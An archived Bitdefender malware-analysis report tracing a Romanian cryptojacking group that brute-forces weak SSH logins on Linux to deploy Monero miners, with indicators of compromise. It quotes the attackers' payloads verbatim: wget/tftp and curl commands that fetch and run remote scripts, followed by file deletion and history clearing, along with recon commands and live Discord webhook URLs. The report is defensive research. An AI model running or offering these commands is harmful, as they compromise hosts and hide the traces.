{
    "id": "3b5c1bc6-499a-4539-98bb-f66e9cffec40",
    "created_at": "2023-01-12T15:05:54.778072Z",
    "updated_at": "2025-03-27T02:06:13.816034Z",
    "deleted_at": null,
    "sha1_hash": "2107ec494df76c54c793c2c6dcd58d362c22b30d",
    "title": "2021-07-14 - How We Tracked a Threat Group Running an Active Cryptojacking Campaign",
    "authors": "",
    "file_creation_date": "2022-05-27T21:36:11Z",
    "file_modification_date": "2022-05-27T21:36:11Z",
    "file_size": 1485304,
    "plain_text": "# How We Tracked a Threat Group Running an Active Cryptojacking Campaign\n\n**[bitdefender.com/blog/labs/how-we-tracked-a-threat-group-running-an-active-cryptojacking-campaign](https://www.bitdefender.com/blog/labs/how-we-tracked-a-threat-group-running-an-active-cryptojacking-campaign)**\n\n[Anti-Malware Research](http://10.10.0.46/blog/labs/tag/antimalware-research/)\n\n10 min read\n\n[Bitdefender](http://10.10.0.46/blog/labs/author/bitdefenderteam/)\nJuly 14, 2021\n\nOne product to protect all your devices, without slowing them down.\n\n[Free 90-day trial](http://10.10.0.46/media/html/consumer/new/get-your-90-day-trial-opt/index.html)\n\n\n-----\n\nBitdefender security researchers have discovered a threat group likely based in Romania that's been active since at least 2020. They've been\ntargeting Linux-based machines with weak SSH credentials, mainly to deploy Monero mining malware, but their toolbox allows for other kinds\nof attacks.\n\nHackers going after weak SSH credentials is not uncommon. Among the biggest problems in security are default user names and passwords,\nor weak credentials hackers can overcome easily with brute force. The tricky part is not necessarily brute-forcing those credentials but doing it\nin a way that lets attackers go undetected.\n\nLike any other threat group, the tools and methods they use can identify them. In this case, their activity involves obfuscating Bash scripts by\ncompiling them with a shell script compiler (shc) and using Discord to report the information back.\n\nIn addition to traditional tools such as `masscan and` `zmap, the threat actors' toolkit includes a previously unreported SSH bruteforcer`\nwritten in Golang. This tool appears to be distributed on an as-a-service model, as it uses a centralized API server. Each threat actor supplies\ntheir API key in their scripts. Like most other tools in this kit, the brute force tool has its interface in a mix of Romanian and English. This leads\nus to believe that its author is part of the same Romanian group.\n\n**Introduction**\n\nWe started investigating this group in May 2021 because of their cryptojacking campaign with the `.93joshua loader. Surprisingly, we traced`\nthe malware easily to `http://45[.]32[.]112[.]68/.sherifu/.93joshua in an open directory. It turns out that the server hosted other`\nfiles. Although the group hid many of the files, their inclusion in other scripts revealed their presence. The associated domain, mexalz.us, has\nhosted malware at least since February 2021.\n\nThe front page of `45[.]32[.]112[.]68 :`\n\n\n-----\n\nThe front page of mexalz.us:\n\n\n-----\n\nThe following tree shows an aggregated representation of the files currently or formerly hosted on mexalz[.]us:\n\n\n-----\n\n```\n|-- .sherifu/\n|  |  .93joshua\n|  |  .k4m3l0t\n|  |  .purrple\n|  |  .zte_error\n|  |  find.sh\n|  |-- jack.tar.gz\n|  |  |-- .jack1992/\n|  |  |  |  brute\n|  |  |  |  dabrute\n|  |  |  |  lists/\n|  |  |  |  mass\n|  |  |  |  masscan\n|  |  |  |  pass\n|  |  |  |  ranges_1.lst\n|  |  juanito.tar.gz\n|  |  |-- .juanito/\n|  |  |  |  brute\n|  |  |  |  go\n|  |  |  |  pass\n|  |  |  |  ps2\n|  |  |  |  r\n|  |  kamelot.tar.gz\n|  |  |-- .md/\n|  |  |  go\n|  |  |  haiduc\n|  |  |  pass\n|  |  satan.db\n|  |  scn.tar.gz\n|  |  |-- .md/\n|  |  |  go\n|  |  |  haiduc\n|  |  |  pass\n|  |  sefu\n|  |  skamelot.tar.gz\n|  |  |-- .b87kamelot/\n|  |  |  |  99x\n|  |  |  |  go\n|  |  |  |  p\n|  |  |  |  r\n|  |  sky\n|-- .mini\n|  |  .black\n|  |  .report_system\n|  |  PhoenixMiner.tar\n|  |  banner\n|  |  ethminer.tar\n|  |  masscan\n\n```\nWe'll be focusing on the original tools in this kit. Some of the files deserve special mention, as they can be connected to attacks seen in the\nwild.\n\nThe files `sefu (bash script) and` `satan.db (gzip archive) are used to propagate the` `chernobyl Demonbot variant, which is hosted on a`\ndifferent server. The infection payload follows these simple steps:\n```\ncd /tmp cd /run cd /;\nwget http://194[.]33[.]45[.]197:8080/chernobyl/chernobyl.sh;\nchmod 777 chernobyl.sh;\nsh chernobyl.sh chernobyl;\ntftp 194[.]33[.]45[.]197 -c get chernobyltftp1.sh;\nchmod 777 chernobyltftp1.sh;\nsh chernobyltftp1.sh chernobyl;\ntftp -r chernobyltftp2.sh -g 194[.]33[.]45[.]197;\nchmod 777 chernobyltftp2.sh;\nsh chernobyltftp2.sh chernobyl;\nrm -rf chernobyl.sh chernobyltftp1.sh chernobyltftp2.sh;\nrm -rf *;\nhistory -c\nsky is a common Perl IRC bot, customized only in respect to the server details and used nicknames. Its C2 is at\narea17[.]mexalz[.]us:6667 .\n\n```\n\n-----\n\n**Finding the victims**\n\nThere's no shortage of compromisable Linux machines with weak SSH credentials. The trick is to find them, and that's done through\nscanning. Attackers host several archives on the server, including `jack.tar.gz,` `juanito.tar.gz,` `scn.tar.gz and`\n```\nskamelot.tar.gz .\n\n```\nThese contain toolchains for cracking servers with weak SSH credentials. We can separate this process into three stages:\n\nreconnaissance: identifying SSH servers via port scanning and banner grabbing\ncredential access: identifying valid credentials via brute-force\ninitial access: connecting via SSH and executing the infection payload\n\nDepending on the stage, the attackers use different tools. For example, `ps and` `masscan are used for reconnaissance, while` `99x /`\n```\nhaiduc (both Outlaw malware) and `brute` are used for credential access and initial access.\n\n```\nIn the currently live campaign, the attackers use the `skamelot.tar.gz`, which includes the following files:\n```\n   r (SHC compiled script) iterates through IP classes and runs go\n   go (SHC compiled script) runs 99x (haiduc) with the infection payload\n   p is a list of attempted credentials\n\n```\nThe infection payload executed in the SSH sessions is:\n```\ncurl -O http://45[.]32[.]112[.]68/.sherifu/.93joshua && chmod 777 .93joshua && ./.93joshua && uname -a\n\n```\n\nNote: This file is still online, but attackers relocated to `mexalz.us .`\n\n**It all begins with a loader**\n\nAfter the attackers find and enter into a Linux device with inadequate SSH credentials, they deploy and execute the loader. In the current\ncampaign, they use `.93joshua, but they have a couple of others at their disposal;` `.purrple and` `.black . All of the loaders are`\nobfuscated via `shc .`\n\nThe loader gathers system information and relays it to the attacker using an HTTP POST to a Discord webhook. By using Discord, the threat\nactors circumvent the need to host their own command-and-control server, as webhooks are means to post data on Discord channel\nprogrammatically. The gathered data can also be conveniently viewed on a channel.\n\nDiscord is increasingly popular among threat actors because of this functionality, as it involuntarily provides support for malware distribution\n(use of its CDN), command-and-control (webhooks) or creating communities centered around buying and selling malware source code and\nservices (e.g. DDoS).\n\nThe information gathered at this step lets the threat actor witness the effectiveness of their tools in infecting machines. The list of victims may\nalso be collected to carry out potential post-exploitation steps.\n\nIn another step of its operation, the loader alters the shell configuration, overwriting the `.bashrc and` `.bash_profile files. The auxiliary`\nfile `/usr/.SQL-Unix/.SQL/.db, used to store part of the commands, is executed via the source built-in in` `.bashrc . This script, in turn,`\ncontains commands that overwrite `.bashrc .`\n\n\n-----\n\nSeveral shell commands are disabled using bash aliases. The purpose of these configurations is to render the shell inoperable to other\noperators, whether they are competing in the realms of malware or they’re legitimate users of the system.\n\nThe attackers also try to achieve persistence so the loader drops some redundant scripts. Their names differ between versions of the loader,\nso we will refer to those in the `.93joshua script:`\n\n- `.k93 is used to launch the miner (.k4m3l0t)`\n\n- `/usr/bin/sshd is a` `systemd service script that launches .k93`\n\n- `.5p4rk3l5 is a crontab file that executes` `.93joshua and` `.k93`\n\nSeveral persistence methods are employed:\n\n- creating a user and adding it to the sudo group; various names are used: `gh0stx,` `sclipicibosu,` `mexalzsherifu`\n\n- adding a SSH key to `authorized_keys (attackers cycled through three different keys depending on the script)`\n\n- creating a `systemd service called` `myservice which runs the` `/usr/bin/sshd script:`\n\n\n-----\n\n**Mining for Monero**\n\nAll of this effort is currently directed towards Monero mining. While the current campaign concerns cryptojacking, we have connected this\ngroup to several DDoS botnets: a Demonbot variant called `chernobyl and a Perl IRC bot.`\n\nAs you all know, mining for cryptocurrency is slow and tedious, but it can go faster when using multiple systems. Owning multiple systems for\nmining is not cheap, so attackers try the next best thing: to remotely compromise devices and use them for mining instead.\n\n[In this case, the group uses custom compiled binaries with embedded configurations of a legitimate miner named XMRig. Typically, the JSON](https://github.com/xmrig/xmrig)\nconfiguration file, which also includes the users and where the currency goes, is external. But in this compiled version, the configuration file in\nembedded.\n\n**Unfortunately, brute force still works**\n\nPeople are the simple reason why brute-forcing SSH credentials still works. Dedicated tools are required for this process, and, in this\nsituation, it's something developed by the group itself.\n\nThis tool, which its author dubbed \"Diicot brute\", is contained in `jack.tar.gz and` `juanito.tar.gz archives.`\n\nAs the usage string from the binary shows, it takes as command-line arguments a port, an \"API key\", number of threads, a file containing a\nlist of IP addresses to be scanned, and a timeout value (seconds).\n```\nSyntax: ./brute [ Port ] [ Key ] [ Routines ] [ IP File ] [ Timeout ]\n\n```\n\nWritten in Golang, the binary was developed in a single package, which contains the following functions:\n\n\n-----\n\nWhile most of the tools used by Mexalz can be used by themselves, the \"Diicot bruter\" is meant to operate on a SaaS (software as a service)\nmodel. The binary communicates with three servers:\n\nan update server (cdn[.]arhive[.]online)\nan API server (requests[.]arhive[.]online)\nDiscord API servers\n\nThe tool requires an \"API key\", supplied as a command-line argument. The key is provided as a parameter in the API endpoints used to\nretrieve the user's configuration. The configuration includes the user's Discord ID, a Discord webhook where the tool's output is POSTed, and\na version number (presumably, the latest version to which the user is licensed to use).\n\nThe `dabrute and` `go scripts contain keys of this type. Rather than random strings, they look like user names and differ between the two`\ninstances, strengthening the assumption that the owners of this toolkit are distinct individuals belonging to the same threat group that share\ntools among themselves.\n\nDiscord hooks are used to report on:\n\nthe start and finish of the tool's execution\nsuccessful exploitations\n\nTwo types of hooks are used: user-dependent, which are retrieved from the API server using the API key, and global, which are hardcoded.\n\nThe global hooks are:\n\n[https://discord[.]com/api/webhooks/796089316517347369/zRjSflkA7z9C4N9PaPWIJQFLMSKGk5iJNv9T_Z880jhLOpkQ3OEGsbdz4GsX80](https://discord/)\n[https://discord[.]com/api/webhooks/845977569446068234/ggGoh-](https://discord/)\n5DEpMLtIi0OKNc8z3b3MgxjZaxovL0R0dBiMsP0hnMTIkNx_JoFTLKJtbyRSx\n\nThe `main.remoteRun function is executed in a dedicated goroutine (lightweight thread) for each (host, username, password) combination.`\nThe implementation of the SSH protocol is provided by the standard library package `golang.org/x/crypto/ssh .`\n\nAfter a successful authentication, the following bash commands are executed in the session with the purpose of collecting system\ninformation:\n```\nuname -s -v -n -r -m\nuptime | grep -ohe 'up .*' | sed 's/,//g' | awk '{ print $2\\\" \\\"$3 }'\nuptime | grep -ohe '[0-9.*] user[s,]'\nlscpu | sed -nr '/Model name/ s/.*:\\\\s*(.*) @ .*/\\\\1/p'\nnproc --all\nnvidia-smi -q | grep \\\"Product Name\\\"\nlspci\ncut -d: -f6 /etc/passwd | grep \\\"/home/\\\"\n\n```\nNotably, one of the commands intends to discover the GPU model, which would be useful to judge the victim's potential in a cryptojacking\nscheme.\n\nOwing to an auto-update feature in the binaries, we managed to locate where it is hosted and gain insight into how it is distributed. The\nupdate server is set up using Github pages.\n\nThe repository is revealed by following the redirect chain:\n\ncdn[.]arhive[.]online/brute -> developer60-stack.github.io/payload.github.io/cdn/brute\n\nThe repository (github.com/developer60-stack/payload.github.io) contains:\n\nsetup, an example usage of the `brute tool that chains the` `zmap port scanner, a banner grabber and a stage for filtering out SSH`\nservers that do not accept password authentication\n```\n   brute, the compiled tool\n   install, a script for installing dependencies and downloading the tool; both setup and install report after every execution stage to a\n\n```\nDiscord hook\n\n\n-----\n\nCreated on May 1 2021, the repository underwent 35 updates (commits).\n\nAn advertisement posted on the hacking forum cracked[.]to in November 2020 shows the price charged for this service and a collage of\nimages showing its interface, including screenshots from the Discord channel.\n\n(censor not in original)\n\n\n-----\n\n(censor belongs to original)\nThe author claims that their tool can filter out honeypots, but this investigation is proof that it doesn't, or at least it couldn’t evade ours.\n\nOur honeypot data shows attacks matching this tool's signature starting in January 2021. The IP addresses they originate from belong to a\nrelatively small set, which tells us that the threat actors are not yet using compromised systems to propagate the malware (worm behavior).\n\nMore information about this threat actor can be freely provided to law enforcement agencies by reaching out to draco@bitdefender.com.\n\n**Indicators of compromise**\n\nSamples:\n\n**sha256** **type** **name** **purpose**\n\nd73a1c77783712e67db71cbbaabd8f158bb531d23b74179cda8b8138ba15941e ELF .93joshua loader\n\ned2ae1f0729ef3a26c98b378b5f83e99741b34550fb5f16d60249405a3f0aa33 ELF .zte_error miner\n\nef335e12519f17c550bba98be2897d8e700deffdf044e1de5f8c72476c374526 ELF .k4m3l0t miner\n\n9de853e88ba363b124dfce61bc766f8f42c84340c7bd2f4195808434f4ed81e3 ELF .black loader\n\neb0f3d25e1023a408f2d1f5a05bf236a00e8602a84f01e9f9f88ff51f04c8c94 ELF .purrple loader\n\ndcc52c4446adba5a61e172b973bca48a45a725a1b21a98dafdf18223ec8eb8b9 ELF .report_system miner\n\n99531a7c39e3ea9529f5f43234ca5b23cb7bb82ee54f04eff631f5ca9153e6d4 ELF go scanner\n\n74a425bcb5eb76851279b420c8da5f57a1f0a99a11770182c356ba3160344846 ELF go scanner\n\n9f691e132f5a2c9468f58aeac9b7aa5df894d1ad54949f87364d1df2bf005414 script go scanner\n\nf53241f60a59ba20d29fab8c973a5b4c05c24865ae033fffb7cdfa799f0ad25d ELF r scanner\n\n275ef26528f36f1af516b0847d90534693d4419db369027b981f77d79f07d357 script dabrute scanner\n\n8beccb10b004308cadad7fa86d6f2ff47c92c95fc557bf05188c283df6942c13 ELF brute scanner\n\nf9ed735b2b8f89f9d8edfc6a8d11a4ee903e153777b33d214c245a02636d7745 ELF brute scanner\n\n23cf4c34f151c622a5818ade68286999ae4db7364b5d9ed7b8ed035c58116179 script sky IRC bot\n\n8dfdbc66ac4a38766ca1cb45f9b50e0f7f91784ad9b6227471469ae5793f6584 script find.sh scanner\n\nf1d4e2d8f63c3b68d56c668aafbf1c82d045814d457c9c83b37115b61c535baa archive jack.tar.gz\n\n3078662f56861c98f96f8bc8647ffa70522dbc22cbd7ba91b9c80bc667d2a3a9 archive juanito.tar.gz\n\n2a8298047add78360dc3e6d5ac4a38ddb7a67deebc769b1201895afe39b8c0e1 archive kamelot.tar.gz\n\n7bfb35caf3f8760868c2985c4ccf749b14deab63ac6effd653871094fed0d5e5 archive satan.db\n\nf6e92eff8887ee28eb56602a3588a3d39ca24a35d9f88fe2551d87dc6ced8913 archive scn.tar.gz\n\n\n-----\n\n**sha256** **type** **name** **purpose**\n\n8bf108ab897a480c44d56088662e592c088939eeb86cccaac6145de35eb3a024 script sefu\n\n31a88ff5c0888bcbbbd02c1c18108c884ff02fd93a476e738d22b627e24601c0 archive skamelot.tar.gz\n\ne89b40a6e781ad80d688d1aa4677151805872b50a08aaf8aa64291456e4d476d archive PhoenixMiner.tar\n\n2ef26484ec9e70f9ba9273a9a7333af195fb35d410baf19055eacbfa157ef251 ELF banner scanner\n\n8970d74d96558b280567acdf147bfe289c431d91a150797aa5e3a8e8d52fb27d archive ethminer.tar\n\n9aa8a11a52b21035ef7badb3f709fa9aa7e757788ad6100b4086f1c6a18c8ab2 ELF masscan scanner\n\n1275e604a90acc2a0d698dde5e972ff30d4c506eae526c38c5c6aaa6a113f164 script setup\n\n977dc6987a12c27878aef5615d2d417b2b518dc2d50d21300bfe1b700071d90e script install\n\nccda60378a7f3232067e2d7cd0efe132e7a3f7c6a299e64ceba319c1f93a9aa2 ELF brute scanner\n\n**Paths:**\n\n/usr/bin/.locationesclipiciu\n/var/tmp/.ladyg0g0/.pr1nc35\n/usr/.SQL-Unix/.SQL/.db\n/var/tmp/.SQL-Unix/.SQL/.db\n/usr/bin/.pidsclip\n\n**Network indicators:**\n\nMexalz[.]us\narea17[.]mexalz[.]us\n45[.]32[.]112[.]68\n207[.]148[.]118[.]221\nrequests[.]arhive[.]online\ncdn[.]arhive[.]online\n\n**Attack matrix:**\n\n\n-----\n\n**TAGS**\n\n[anti-malware research](http://10.10.0.46/blog/labs/tag/antimalware-research/)\n\n**AUTHOR**\n\n## Bitdefender\n\nThe meaning of Bitdefender’s mascot, the Dacian Draco, a symbol that depicts a mythical animal with a wolf’s head and a dragon’s body, is\n“to watch” and to “guard with a sharp eye.”\n\n[View all posts](http://10.10.0.46/blog/labs/author/bitdefenderteam/)\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-14 - How We Tracked a Threat Group Running an Active Cryptojacking Campaign.pdf"
    ],
    "report_names": [
        "2021-07-14 - How We Tracked a Threat Group Running an Active Cryptojacking Campaign.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535954,
    "ts_updated_at": 1743041173,
    "ts_creation_date": 1653687371,
    "ts_modification_date": 1653687371,
    "files": {
        "pdf": "https://archive.orkl.eu/2107ec494df76c54c793c2c6dcd58d362c22b30d.pdf",
        "text": "https://archive.orkl.eu/2107ec494df76c54c793c2c6dcd58d362c22b30d.txt",
        "img": "https://archive.orkl.eu/2107ec494df76c54c793c2c6dcd58d362c22b30d.jpg"
    }
}